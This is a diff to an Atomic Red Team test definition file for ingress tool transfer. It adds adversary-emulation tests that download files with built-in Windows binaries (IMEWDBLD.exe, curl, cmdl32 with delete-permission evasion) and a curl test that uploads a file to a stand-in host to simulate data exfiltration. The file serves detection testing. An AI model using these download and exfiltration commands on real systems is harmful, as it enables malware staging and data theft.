@@ -311,11 +311,11 @@ atomic_tests:
   input_arguments:
     remote_file:
       description: URL of file to download
-      type: url
+      type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
     local_path:
       description: Location to save downloaded file
-      type: path
+      type: Path
       default: '%temp%\Atomic-license.txt'
   dependency_executor_name: powershell
   dependencies:
@@ -339,11 +339,9 @@ atomic_tests:
   auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
   description: |
     Download a remote file using the whois utility
-
   supported_platforms:
   - linux
   - macos
-
   input_arguments:
     remote_host:
       description: Remote hostname or IP address
@@ -365,7 +363,6 @@ atomic_tests:
       description: Timeout period before ending process (seconds)
       type: Integer
       default: 1
-
   dependencies:
     - description: |
         The whois and timeout commands must be present
@@ -373,7 +370,6 @@ atomic_tests:
         which whois && which timeout
       get_prereq_command: |
         echo "Please install timeout and the whois package"
-
   executor:
     name: sh
     elevation_required: false
@@ -381,7 +377,6 @@ atomic_tests:
       timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
     cleanup_command: |
       rm -f #{output_file}
-
 - name: File Download via PowerShell
   auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
   description: |
@@ -391,17 +386,16 @@ atomic_tests:
   input_arguments:
     target_remote_file:
       description: File to download
-      type: string
+      type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
     output_file:
       description: File to write to
-      type: string
+      type: String
       default: LICENSE.txt
   executor:
     command: |
       (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
     name: powershell
-
 - name: File download with finger.exe on Windows
   auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
   description: |
@@ -409,18 +403,153 @@ atomic_tests:
     Because this is being tested on the localhost, you should not be expecting a successful connection
     https://www.exploit-db.com/exploits/48815
     https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
-  
   supported_platforms:
   - windows
-
   input_arguments:
     remote_host:
       description: Remote hostname or IP address
       type: String
       default: localhost
-
   executor:
     name: command_prompt
     command: |
       finger base64_filedata@#{remote_host}
-      
+- name: Download a file with IMEWDBLD.exe
+  auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
+  description: |
+    Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
+    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
+    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: Location of file to be downloaded.
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+    file_name:
+      description: Name of the file to be downloaded without extension.
+      type: string
+      default: T1105
+  executor:
+    command: |
+      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+      & $imewdbled #{remote_url}
+    cleanup_command: |
+      $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
+      $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
+      if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
+    name: powershell
+
+- name: Curl Download File
+  auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
+  description: |
+    The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
+    Expected output will include whether the file downloaded successfully or not.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_download:
+      description: File to download
+      type: String
+      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+    curl_path:
+      description: path to curl.exe
+      type: Path
+      default: C:\Windows\System32\Curl.exe
+  dependency_executor_name: powershell 
+  dependencies: 
+    - description: |
+        Curl must be installed on system.
+      prereq_command: |
+        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
+        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+        Remove-Item $env:temp\curl
+        Remove-Item $env:temp\curl.zip
+  executor:
+    command: |
+      #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
+    cleanup_command: |
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\programdata\allthethingsx64.dll >nul 2>&1
+      del %Temp%\allthethingsx64.dll >nul 2>&1
+    name: command_prompt
+
+- name: Curl Upload File
+  auto_generated_guid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
+  description: |
+    The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
+    Expected output will include whether the file uploaded successfully or not.
+  supported_platforms:
+  - windows
+  input_arguments:
+    curl_path:
+      description: path to curl.exe
+      type: Path
+      default: C:\Windows\System32\Curl.exe
+    remote_destination:
+      description: Remote destination
+      type: String
+      default: www.example.com
+    file_path:
+      description: File to upload
+      type: String
+      default: c:\temp\atomictestfile.txt
+  dependency_executor_name: powershell 
+  dependencies: 
+    - description: |
+        Curl must be installed on system.
+      prereq_command: |
+        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest “https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip” -Outfile $env:temp\curl.zip
+        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+        Remove-Item $env:temp\curl
+        Remove-Item $env:temp\curl.zip
+    - description: |
+        A file must be created to upload
+      prereq_command: |
+        if (Test-Path #{file_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        echo "This is an Atomic Test File" > #{file_path}
+  executor:
+    command: |
+      #{curl_path} -T #{file_path} #{remote_destination}
+      #{curl_path} --upload-file #{file_path} #{remote_destination}
+      #{curl_path} -d #{file_path} #{remote_destination}
+      #{curl_path} --data #{file_path} #{remote_destination}
+    name: command_prompt
+
+- name: Download a file with Microsoft Connection Manager Auto-Download 
+  auto_generated_guid: d239772b-88e2-4a2e-8473-897503401bcc
+  description: |
+    Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. 
+    The issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.
+    Upon successful execution the test will open calculator and Notepad executable for 10 seconds.
+    reference:
+    https://twitter.com/ElliotKillick/status/1455897435063074824
+    https://github.com/LOLBAS-Project/LOLBAS/pull/151
+    https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/
+    https://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html
+  supported_platforms:
+    - windows
+  input_arguments:
+    Path_to_file:
+      description: Path to the Batch script
+      type: Path
+      default: PathToAtomicsFolder\T1105\src\T1105.bat
+  executor:
+    command: |
+      #{Path_to_file} 1>NUL 
+    cleanup_command: |
+      del /f/s/q %temp%\T1105 >nul 2>&1
+      rmdir /s/q %temp%\T1105 >nul 2>&1
+    name: command_prompt
